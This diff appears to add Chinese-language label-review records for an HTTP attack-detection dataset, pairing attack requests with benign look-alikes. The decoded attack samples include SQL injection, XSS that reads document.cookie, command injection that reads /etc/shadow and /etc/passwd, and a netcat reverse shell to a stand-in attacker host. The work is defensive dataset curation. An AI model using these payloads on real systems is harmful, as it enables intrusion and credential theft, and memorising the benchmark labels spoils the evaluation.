+判断理由：只有 IP、逗号和空格，没有引号/函数/注释；作为"IP 列表头"的正常对照成立
+（normal_counterpart=ip_list_header）。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-SQLI-10-A
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：02415f106da7d4a2658f85d3b71221b40fb11228d4d4dc4a7903dccc39c57080
+原标签：attack
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：GET /items/<path> 的路径段（第 136 行）
+
+主审结论：agree
+
+输入来源：路径段。
+输入经过的处理过程：URL 一次解码，得到 /items/0 UNION SELECT 0x61646d696e,0x70617373；
+0x61646d696e = "admin"，0x70617373 = "pass"。
+最终输出位置或危险操作：无源码；SQL 特征位于路径段。
+已有防护及其适用范围：不适用。
+
+判断理由：UNION SELECT 加十六进制字面量，用于在数字型路径参数上拼接结果集（绕过引号过滤）；
+与 technique=union_hex_literal 一致。
+建议标签：保持 attack
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持 /items/ 路径段与 anchor UNION%20SELECT%200x61646d696e
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-SQLI-10-N
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：2ee70f1b4b4c8c38695d290e147da73e217c988d8931995595702a9fca95ffde
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：GET /items/<path> 的路径段（第 141 行）
+
+主审结论：agree
+
+输入来源：路径段。
+输入经过的处理过程：URL 解码，得到 /items/0x7f3a9c。
+最终输出位置或危险操作：无源码；普通十六进制风格标识符。
+已有防护及其适用范围：不适用。
+
+判断理由：以 0x 开头的十六进制串只是标识符，没有 UNION/SELECT 或空格分隔的关键字；
+作为"类十六进制标识符"的正常对照成立（normal_counterpart=hex_like_identifier）。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-CMDI-05-A
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：a87e226594f9657201b5d853073f78952c72be0f8fd699e99edb991059a10791
+原标签：attack
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：GET /tools/nslookup 的查询参数 domain（第 146 行）
+
+主审结论：agree
+
+输入来源：查询参数 domain。
+输入经过的处理过程：URL 一次解码，得到 example.test\nid（%0A 为换行）。
+最终输出位置或危险操作：无源码；命令注入特征位于 domain。
+已有防护及其适用范围：不适用。
+
+判断理由：换行在 shell 中可分隔命令，nslookup 后追加 id；这是"换行分隔"的注入形态
+（technique=newline_separator）。请求含特征成立。
+建议标签：保持 attack
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持 domain 参数与 anchor %0Aid
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-CMDI-05-N
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：1c725282cd02fec40886c8d5be84d0b91fd00759555cbedfa8ea14e5af32211e
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：GET /feedback 的查询参数 comment（第 151 行）
+
+主审结论：agree
+
+输入来源：查询参数 comment。
+输入经过的处理过程：URL 解码，得到 Line one\nLine two。
+最终输出位置或危险操作：无源码；普通多行反馈文本。
+已有防护及其适用范围：不适用。
+
+判断理由：换行只用于排版，后面不是命令名；作为"多行文本"的正常对照成立
+（normal_counterpart=multiline_comment）。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：正常对照与攻击样本端点不同（/feedback 对 /tools/nslookup）；请求级检测只看内容，
+不影响该样本作为正常对照
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-CMDI-06-A
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：1fd1062a4ef2d518a2348b47b5de1fe3499b236dc0579f518b97f0894f228195
+原标签：attack
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：POST /tools/archive 的表单字段 path（第 160 行请求体）
+
+主审结论：agree
+
+输入来源：application/x-www-form-urlencoded 的 path。
+输入经过的处理过程：URL 解码，得到 /tmp/missing || cat /etc/shadow。
+最终输出位置或危险操作：无源码；命令注入特征位于 path。
+已有防护及其适用范围：不适用。
+
+判断理由：|| 是 shell 的逻辑或命令分隔：前一条失败时执行 cat /etc/shadow，读取敏感文件；
+与 technique=or_chain 一致。
+建议标签：保持 attack
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持 path 字段与 anchor %7C%7C+cat
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-CMDI-06-N
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：616dd8f41d0192037d3eaa28af08713390cc431621408c5c96bb580f7d8cd6e5
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：POST /tools/archive 的表单字段 path、note（第 167 行请求体）
+
+主审结论：agree
+
+输入来源：表单字段 path=/srv/data、note=keep daily || weekly。
+输入经过的处理过程：URL 解码，得到 /srv/data 与 keep daily || weekly。
+最终输出位置或危险操作：无源码；正常路径与说明文本。
+已有防护及其适用范围：不适用。
+
+判断理由：path 是普通目录；note 中的 || 是自然语言"或"，没有命令名；作为"逻辑或文本"的正常对照
+成立（normal_counterpart=logical_or_text）。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-CMDI-07-A
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：693996b84d7e392a623d14a9ccd0c90f4b29c73ad69f95c3431b9edc649286ce
+原标签：attack
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：POST /api/convert 的 JSON 字段 file（第 174 行请求体）
+
+主审结论：agree
+
+输入来源：JSON 体 file。
+输入经过的处理过程：JSON 解析（无 URL 编码），得到 a.png;cat${IFS}/etc/passwd。
+最终输出位置或危险操作：无源码；命令注入特征位于 file。
+已有防护及其适用范围：不适用。
+
+判断理由：分号分隔命令，${IFS} 用 shell 内置变量代替空格以躲避基于空格的检测；cat /etc/passwd
+读取敏感文件。与 technique=ifs_evasion 一致。
+建议标签：保持 attack
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持 file 字段与 anchor cat${IFS}
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-CMDI-07-N
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：0872c758f6d024f6f10baf7aa5d5e6d5c31e6deefb007d575718bc492a16dfc9
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：POST /api/convert 的 JSON 字段 file、note（第 181 行）
+
+主审结论：agree
+
+输入来源：JSON 体 file=report.png、note="use ${HOME}/exports as target"。
+输入经过的处理过程：JSON 解析，字符串中的 ${HOME} 原样保留。
+最终输出位置或危险操作：无源码；普通文件名与说明。
+已有防护及其适用范围：不适用。
+
+判断理由：${HOME} 出现在说明文本中，没有命令名或分隔符；作为"shell 变量文本"的正常对照成立
+（normal_counterpart=shell_variable_text）。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-CMDI-08-A
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：cb3f8785120828b0ff7bfdccb79a5237fb4edf42d6df86b4257acea65b650ad2
+原标签：attack
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：POST /api/diagnostics 的 text/plain 请求体（第 188 行）
+
+主审结论：agree
+
+输入来源：text/plain 请求体。
+输入经过的处理过程：无编码，内容为 host=10.0.0.5 & ping -n 30 127.0.0.1。
+最终输出位置或危险操作：无源码；命令注入特征位于请求体。
+已有防护及其适用范围：不适用。
+
+判断理由：& 是 Windows cmd 的命令分隔符，ping -n 30 制造延时（常用于盲注/DoS 验证）；
+与 technique=windows_ampersand、normal_counterpart=ampersand_prose 一致。
+建议标签：保持 attack
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持 text/plain 体与 anchor & ping -n 30
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-CMDI-08-N
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：484b536d4ce9562be922aa0fb4321b5c4cd7797ad5c46195c03b7b7ab854a3dd
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：POST /api/diagnostics 的 text/plain 请求体（第 195 行）
+
+主审结论：agree
+
+输入来源：text/plain 请求体。
+输入经过的处理过程：无编码，内容为 Status update: database & cache are healthy.。
+最终输出位置或危险操作：无源码；普通状态说明。
+已有防护及其适用范围：不适用。
+
+判断理由：& 只是英语连词，前后没有命令；作为"ampersand 散文"的正常对照成立。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-CMDI-09-A
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：d8052f07662077837a9f676fe7c6f52e21159bc4e3652c8f9fd238df238f93c5
+原标签：attack
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：请求头 X-Client-Version（第 200 行）
+
+主审结论：agree
+
+输入来源：自定义请求头 X-Client-Version。
+输入经过的处理过程：无编码，原样为
+2.4.1 | nc attacker.example.test 4444 -e /bin/sh。
+最终输出位置或危险操作：无源码；命令注入特征位于该头。
+已有防护及其适用范围：不适用。
+
+判断理由：单管道把 nc 的 stdin/stdout 接到 /bin/sh，是反弹 shell 特征；与 technique=pipe 一致。
+请求含特征成立。
+建议标签：保持 attack
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持 X-Client-Version 头与 anchor | nc attacker
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-CMDI-09-N
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：6a2a0fcf8e74168feaecdcbcaeaf187c845118a3b9c02b7e7502335a7988c3d3
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：请求头 X-Client-Version（第 206 行）
+
+主审结论：agree
+
+输入来源：X-Client-Version 请求头。
+输入经过的处理过程：无编码，2.4.1|build-8812。
+最终输出位置或危险操作：无源码；普通版本号拼接串。
+已有防护及其适用范围：不适用。
+
+判断理由：管道符号只用于版本/构建号分隔，后面不是命令；作为"版本串含管道"的正常对照成立
+（normal_counterpart=pipe_in_version_string）。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-CMDI-10-A
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：0c55cf2dc90c03b26cb61e1c4943d74fe3282dc99755b7af8f714da86bf2cbba
+原标签：attack
+原 CWE：CWE-78
+原漏洞行号或 HTTP 位置：GET /tools/ping 的查询参数 host（第 210 行）
+
+主审结论：agree
+
+输入来源：查询参数 host。
+输入经过的处理过程：URL 一次解码，得到 127.0.0.1;w'h'o'a'mi。
+最终输出位置或危险操作：无源码；命令注入特征位于 host。
+已有防护及其适用范围：不适用。
+
+判断理由：分号后命令名被引号拆成 w'h'o'a'mi，shell 会拼接为 whoami，用于绕过关键字匹配；
+与 technique=quote_split_command 一致。
+建议标签：保持 attack
+建议 CWE：保持 CWE-78
+建议行号或 HTTP 位置：保持 host 参数与 anchor w%27h%27o%27a%27mi
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-CMDI-10-N
+所属数据集：原保留集
+所在 bundle 文件：samples/holdout/http/requests.bundle.txt
+样例 SHA256：17deb2be160a61d4f2964bcf2f6eb4c4b7fbcefe83c0c958b56612ad7cbf345c
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：GET /files 的查询参数 path（第 215 行）
+
+主审结论：agree
+
+输入来源：查询参数 path。
+输入经过的处理过程：URL 一次解码，得到 C:\Users\Public\report.txt。
+最终输出位置或危险操作：无源码；普通 Windows 文件路径。
+已有防护及其适用范围：不适用。
+
+判断理由：反斜杠和冒号只是路径分隔/盘符，没有命令分隔符；作为"反斜杠路径"的正常对照成立
+（normal_counterpart=backslash_path）。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：正常对照与攻击样本端点不同（/files?path= 对 /tools/ping?host=）；请求级检测只看内容，
+不影响该样本作为正常对照
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+====================================================================
+八、开发集 HTTP 请求（samples/dev/http/requests.bundle.txt，24 条）
+====================================================================
+
+【样例复核记录】
+
+样例 ID：HTTP-XSS-01-A
+所属数据集：开发集
+所在 bundle 文件：samples/dev/http/requests.bundle.txt
+样例 SHA256：a6c21ce1e6d4e3432c80427a235618a71eb1f2f9179be145e1720fb60e303281
+原标签：attack
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：GET /search 的查询参数 q（第 6 行）
+
+主审结论：agree
+
+输入来源：查询参数 q。
+输入经过的处理过程：URL 一次解码，得到 <script>alert(document.domain)</script>。
+最终输出位置或危险操作：无源码；XSS 特征位于 q。
+已有防护及其适用范围：不适用。
+
+判断理由：完整的 script 标签，读取文档域后弹窗，是经典反射型 XSS 载荷；anchor %3Cscript%3E 一致。
+建议标签：保持 attack
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持 q 参数
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-XSS-01-N
+所属数据集：开发集
+所在 bundle 文件：samples/dev/http/requests.bundle.txt
+样例 SHA256：425b0c177536ae17f4effb3ebdc94d7d8613360acac7760d5c95bbcca85b3e0e
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：GET /search 的查询参数 q（第 12 行）
+
+主审结论：agree
+
+输入来源：查询参数 q。
+输入经过的处理过程：URL 解码（+ 为空格），得到 I <3 handmade mugs。
+最终输出位置或危险操作：无源码；普通商品搜索。
+已有防护及其适用范围：不适用。
+
+判断理由：只有"<3"这种表情文本，没有标签名、事件处理器或闭合结构；作为"含尖括号的正常文本"
+对照成立（normal_counterpart=angle_bracket_text）。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-XSS-02-A
+所属数据集：开发集
+所在 bundle 文件：samples/dev/http/requests.bundle.txt
+样例 SHA256：f81203b3942c313e1662096b906b1dc819d6995cdec84b5e4821e34345d52651
+原标签：attack
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：POST /api/profile 的 JSON 字段 display_name（第 22 行请求体）
+
+主审结论：agree
+
+输入来源：application/json 的 display_name。
+输入经过的处理过程：JSON 解析（无 URL 编码），得到 <img src=x onerror=alert(1)>。
+最终输出位置或危险操作：无源码；XSS 特征位于 display_name。
+已有防护及其适用范围：不适用。
+
+判断理由：图片加载失败触发 onerror 执行脚本，是事件处理器型 XSS；与 technique=event_handler 一致。
+建议标签：保持 attack
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持 display_name 字段与 anchor onerror=alert(1)
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-XSS-02-N
+所属数据集：开发集
+所在 bundle 文件：samples/dev/http/requests.bundle.txt
+样例 SHA256：4a2a4e84e2047c7af8bcfeeaebc2c941b6180f24707558b67f9bfbbae8b68d6e
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：POST /api/profile 的 JSON 体（第 29 行）
+
+主审结论：agree
+
+输入来源：JSON 体 display_name、bio。
+输入经过的处理过程：JSON 解析；display_name=Ada，
+bio="Uploaded avatar image.png; see the img folder"。
+最终输出位置或危险操作：无源码；普通个人资料文本。
+已有防护及其适用范围：不适用。
+
+判断理由：含 "img" 单词和分号，但没有 < > 标签结构或事件处理器；作为"HTML 关键词文本"的正常对照
+成立（normal_counterpart=html_like_words）。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-XSS-03-A
+所属数据集：开发集
+所在 bundle 文件：samples/dev/http/requests.bundle.txt
+样例 SHA256：41a45b1239b792ca1822cd3b1926edd9a014b3baae9986823d5d90cce00d3aa5
+原标签：attack
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：POST /feedback 的表单字段 message（第 36 行请求体）
+
+主审结论：agree
+
+输入来源：application/x-www-form-urlencoded 的 message。
+输入经过的处理过程：URL 解码两次：第一次得到 %3Csvg%20onload%3Dalert%281%29%3E，
+第二次得到 <svg onload=alert(1)>。
+最终输出位置或危险操作：无源码；XSS 特征需二次解码后出现。
+已有防护及其适用范围：不适用。
+
+判断理由：二次编码是真实的绕过手法，只有应用重复解码时才生效；family 明确标注 encoding=url_twice，
+anchor %253Csvg 与设计一致。作为攻击样本成立，但检测器必须支持多轮解码。
+建议标签：保持 attack
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持 message 字段与 anchor %253Csvg
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：若服务端只解码一次则不构成 XSS；这是编码层设计，不是标签错误
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-XSS-03-N
+所属数据集：开发集
+所在 bundle 文件：samples/dev/http/requests.bundle.txt
+样例 SHA256：d9bc8eedc3d247b3f9684e8c4992057f085144b4f2ac1fae211aa6d3e2fc6172
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：POST /feedback 的表单字段 message（第 43 行请求体）
+
+主审结论：agree
+
+输入来源：表单字段 message。
+输入经过的处理过程：URL 解码，得到 Tom & Jerry = classic; 100% agree。
+最终输出位置或危险操作：无源码；普通反馈文本。
+已有防护及其适用范围：不适用。
+
+判断理由：&、=、;、% 都是标点/百分号，没有标签或脚本；作为"编码标点"的正常对照成立
+（normal_counterpart=encoded_punctuation）。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-XSS-04-A
+所属数据集：开发集
+所在 bundle 文件：samples/dev/http/requests.bundle.txt
+样例 SHA256：2552d5328d6cbae38dbe421020d80d61a8cb0f6f02eb1be5ad730db2ecea5f3c
+原标签：attack
+原 CWE：CWE-79
+原漏洞行号或 HTTP 位置：GET /login 的查询参数 next（第 46 行）
+
+主审结论：agree
+
+输入来源：查询参数 next。
+输入经过的处理过程：URL 一次解码，得到 javascript:alert(document.cookie)。
+最终输出位置或危险操作：无源码；XSS/跳转特征位于 next。
+已有防护及其适用范围：不适用。
+
+判断理由：javascript: URI 在跳转/链接参数里可执行脚本并读取 cookie，是 scheme 型 XSS 载荷；
+与 technique=javascript_uri 一致。请求含特征成立。
+建议标签：保持 attack
+建议 CWE：保持 CWE-79
+建议行号或 HTTP 位置：保持 next 参数与 anchor javascript%3Aalert
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：若服务端只把它用于 Location 头，也可能构成开放重定向；按 XSS 记录可接受
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-XSS-04-N
+所属数据集：开发集
+所在 bundle 文件：samples/dev/http/requests.bundle.txt
+样例 SHA256：90363e5549fadc6d0317acfbacc01978d0897138bd51c60442c75196cd4e2294
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：GET /login 的查询参数 next（第 51 行）
+
+主审结论：agree
+
+输入来源：查询参数 next。
+输入经过的处理过程：URL 一次解码，得到 /account/settings?tab=security。
+最终输出位置或危险操作：无源码；普通站内相对跳转。
+已有防护及其适用范围：不适用。
+
+判断理由：相对路径 + 查询串，没有 scheme 或脚本；作为"相对跳转"的正常对照成立
+（normal_counterpart=relative_redirect）。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-SQLI-01-A
+所属数据集：开发集
+所在 bundle 文件：samples/dev/http/requests.bundle.txt
+样例 SHA256：f099d13d8158de1ce298fc4e61d4eceef59a54c7dfd7c87c0348d2ba6aff5c52
+原标签：attack
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：GET /products 的查询参数 category（第 56 行）
+
+主审结论：agree
+
+输入来源：查询参数 category。
+输入经过的处理过程：URL 一次解码，得到
+1 UNION SELECT username,password_hash FROM users--。
+最终输出位置或危险操作：无源码；SQL 特征位于 category。
+已有防护及其适用范围：不适用。
+
+判断理由：UNION SELECT 读取 users 表的账号与口令哈希，并用 -- 注释掉原查询尾部，是联合查询注入的
+完整形态；与 technique=union_select 一致。
+建议标签：保持 attack
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持 category 参数与 anchor UNION%20SELECT
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-SQLI-01-N
+所属数据集：开发集
+所在 bundle 文件：samples/dev/http/requests.bundle.txt
+样例 SHA256：51d79a9089cb2c94e92ead6bdc255818f882e70c4103fc4ae84070a63dde7c7e
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：GET /products 的查询参数 category、q（第 61 行）
+
+主审结论：agree
+
+输入来源：查询参数 category=travel、q=union station tote bag。
+输入经过的处理过程：URL 解码（+ 为空格），得到 travel 与 union station tote bag。
+最终输出位置或危险操作：无源码；普通商品搜索。
+已有防护及其适用范围：不适用。
+
+判断理由："union" 只是商品名中的单词，没有 SELECT/注释/引号结构；作为"含 SQL 关键词的正常文本"
+对照成立（normal_counterpart=sql_keyword_words）。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-SQLI-02-A
+所属数据集：开发集
+所在 bundle 文件：samples/dev/http/requests.bundle.txt
+样例 SHA256：0578961125948199bab5f06d8c7edd5820fa3a1414fee5d31a9889621702e14a
+原标签：attack
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：POST /login 的表单字段 password（第 70 行请求体）
+
+主审结论：agree
+
+输入来源：application/x-www-form-urlencoded 的 password（username=admin）。
+输入经过的处理过程：URL 解码，得到 ' or '1'='1。
+最终输出位置或危险操作：无源码；SQL 特征位于 password。
+已有防护及其适用范围：不适用。
+
+判断理由：闭合引号后构造恒真条件，是登录绕过型布尔注入；与 technique=boolean_tautology 一致。
+建议标签：保持 attack
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持 password 字段与 anchor password=%27+or+%271%27
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-SQLI-02-N
+所属数据集：开发集
+所在 bundle 文件：samples/dev/http/requests.bundle.txt
+样例 SHA256：98311d4f88856e3b3fb54d02458828170c85e4b93c6f0a84f03208b02e0cef02
+原标签：normal
+原 CWE：null
+原漏洞行号或 HTTP 位置：POST /login 的 password 字段（第 77 行请求体）
+
+主审结论：agree
+
+输入来源：password 字段。
+输入经过的处理过程：URL 解码，得到 O'Neil-2024!。
+最终输出位置或危险操作：无源码；普通密码。
+已有防护及其适用范围：不适用。
+
+判断理由：单引号是姓名 O'Neil 的一部分，后面没有 SQL 关键字/恒真结构；作为"密码含单引号"的正常对照
+成立（normal_counterpart=apostrophe_in_password）。
+建议标签：保持 normal
+建议 CWE：null（保持）
+建议行号或 HTTP 位置：保持
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
+样例 ID：HTTP-SQLI-03-A
+所属数据集：开发集
+所在 bundle 文件：samples/dev/http/requests.bundle.txt
+样例 SHA256：8e72f3c10e691f5923a3528e668294fc84fefd6d449e4ecffe75812ed04d31a2
+原标签：attack
+原 CWE：CWE-89
+原漏洞行号或 HTTP 位置：POST /api/orders/lookup 的 JSON 字段 order_id（第 84 行请求体）
+
+主审结论：agree
+
+输入来源：JSON 体 order_id。
+输入经过的处理过程：JSON 解析，得到 1001 AND SLEEP(5)。
+最终输出位置或危险操作：无源码；SQL 特征位于 order_id。
+已有防护及其适用范围：不适用。
+
+判断理由：AND SLEEP(5) 是时间盲注载荷，用响应延迟判断条件真假；与 technique=time_based 一致。
+建议标签：保持 attack
+建议 CWE：保持 CWE-89
+建议行号或 HTTP 位置：保持 order_id 字段与 anchor SLEEP(5)
+证据文件：证据\04_HTTP请求解码核对.txt
+待确认问题：无
+
+主审人：visibywang
+主审日期：2026-11-12
+交叉复核人：未安排（本次单人复核）
+交叉复核意见：无
+仍未解决的分歧：无
+
+【样例复核记录】
+
